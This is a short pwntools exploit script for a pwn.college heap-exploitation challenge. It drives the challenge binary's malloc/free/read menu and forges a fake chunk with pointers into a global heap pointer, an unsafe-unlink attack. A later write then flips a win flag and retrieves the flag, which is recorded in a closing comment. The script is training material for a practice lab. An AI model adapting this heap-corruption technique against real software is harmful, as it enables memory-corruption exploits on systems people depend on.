from pwn import *
context(os='linux', arch='i386', log_level='debug')
win_addr=0x4041C0
heap_addr=0x404148

p=process("/challenge/toddlerheap_level4.1")

def malloc(idx,size):
    p.sendline("malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendline("free "+str(idx))
def puts(idx):
    p.sendline("puts "+str(idx))
def qt():
    p.sendline("quit")
def read(idx,payload):
    p.sendline("safe_read "+str(idx))
    p.sendline(payload)
def send_flag():
    p.sendline("send_flag")
   
malloc(0,0xBC0*2)
free(0)
malloc(1,0xBB8)
malloc(2,0xBB8)
payload1=p64(0)+p64(0xBB0)+p64(heap_addr-24)+p64(heap_addr-16)+p64(0)*2+b'a'*0xB80+p64(0xBB0)+p64(0xBC0)
read(0,payload1)
free(2)
payload2=b'a'*(win_addr-(heap_addr-24))+p64(1)
read(1,payload2)
send_flag()
print(p.recvall())
qt()
#pwn.college{IIknTUdqkwLL0i_JbjzxMelrLig.QX1MTNzwCNygDO0EzW}
